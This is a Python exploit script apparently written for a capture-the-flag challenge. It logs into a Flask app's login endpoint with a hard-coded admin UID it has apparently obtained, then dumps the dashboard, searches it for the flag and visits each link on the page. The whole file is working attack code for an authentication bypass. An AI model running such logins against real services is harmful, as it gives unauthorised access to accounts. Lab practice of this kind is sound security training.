import requests
import re

BASE_URL = "http://8080-f38af472-f3ae-405c-9d07-9ac048a61efd.challenge.ctfplus.cn"
session = requests.Session()

print("[*] Flask 备份接口漏洞 - 突破成功!")
print(f"[*] Target: {BASE_URL}")
print()

# 用 ADMiN 的 UID POST 登录
uid = "3553c1effa0b4698895a4874cfbd86d8"

print(f"[*] POST /login with UID: {uid}")
login_resp = session.post(f"{BASE_URL}/login", data={"uid": uid})
print(f"    Status: {login_resp.status_code}")

# 保存完整响应
with open("dashboard_full.html", "w", encoding="utf-8") as f:
    f.write(login_resp.text)
print(f"    [+] 保存到 dashboard_full.html")

# 打印响应
print(f"\n[*] 完整响应:")
print(login_resp.text)

# 检查关键词
text_lower = login_resp.text.lower()
if "flag" in text_lower:
    print(f"\n[!!!] 发现 flag!")
    flag_match = re.search(r'flag\{[^}]+\}', login_resp.text, re.IGNORECASE)
    if flag_match:
        print(f"[!!!] Flag: {flag_match.group()}")

if "backup" in text_lower:
    print(f"\n[+] 发现 backup 关键词!")

# 提取所有链接
links = re.findall(r'href=["\']([^"\']+)["\']', login_resp.text)
if links:
    print(f"\n[!] 发现链接: {links}")

# 提取所有按钮
buttons = re.findall(r'<button[^>]*>([^<]+)</button>', login_resp.text)
if buttons:
    print(f"\n[!] 发现按钮: {buttons}")

# 尝试访问所有链接
print(f"\n[*] 尝试访问发现的链接")
for link in links:
    print(f"    [-] {link}")
    resp = session.get(f"{BASE_URL}{link}")
    print(f"        Status: {resp.status_code}")
    if resp.status_code != 404:
        print(f"        {resp.text[:500]}")
        if "flag" in resp.text.lower():
            print(f"        [!!!] 发现 flag!")

print()
print("[*] 完成!")
